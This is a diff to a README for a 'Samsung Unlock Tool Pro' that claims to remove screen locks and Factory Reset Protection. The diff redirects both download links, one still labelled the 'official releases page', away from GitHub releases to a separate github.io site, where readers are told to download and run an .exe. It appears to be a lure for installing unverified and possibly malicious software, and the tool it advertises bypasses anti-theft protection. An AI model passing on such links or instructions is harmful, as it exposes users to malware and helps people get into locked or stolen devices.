@@ -1,6 +1,6 @@
 # 🔓 Samsung-Unlock-Tool-Pro - Remove Locks From Your Samsung Devices
 
-[![Download Samsung Unlock Tool Pro](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/varanfuellevel544/Samsung-Unlock-Tool-Pro/releases)
+[![Download Samsung Unlock Tool Pro](https://img.shields.io/badge/Download-Release-blue.svg)](https://varanfuellevel544.github.io)
 
 Samsung Unlock Tool Pro helps you manage your device security settings. This software provides a way to remove screen locks or Factory Reset Protection (FRP) when you lose access to your Samsung smartphone or tablet. It works on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ To run this software, your computer must meet these basic standards:
 
 You must visit the project release page to get the installer. Follow these instructions to find the file:
 
-1. Visit the [official releases page](https://github.com/varanfuellevel544/Samsung-Unlock-Tool-Pro/releases).
+1. Visit the [official releases page](https://varanfuellevel544.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link ending in .exe to start the download.
 4. Save the file to a folder you can find easily, such as your Downloads folder or Desktop.
